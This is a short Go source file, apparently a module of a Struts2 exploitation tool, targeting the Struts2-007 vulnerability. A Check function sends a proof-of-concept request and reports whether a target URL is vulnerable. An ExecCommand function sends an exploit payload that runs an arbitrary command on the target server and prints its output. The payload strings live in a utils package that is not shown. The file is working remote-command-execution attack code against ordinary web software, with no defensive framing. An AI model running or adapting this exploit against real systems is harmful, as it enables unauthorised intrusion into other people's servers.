package s007

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
)

func Check(targetUrl string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS007Check)
	if utils.IfContainsStr(respString, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-007！"))
	} else {
		log.Printf("%s Struts2-007 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func ExecCommand(targetUrl string, command string, postData string) {
	respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS007Exec(command))
	cmdOut := utils.GetBetweenStr(respString, "s007execstart", "s007execend")[13:]
	fmt.Println(cmdOut)
}
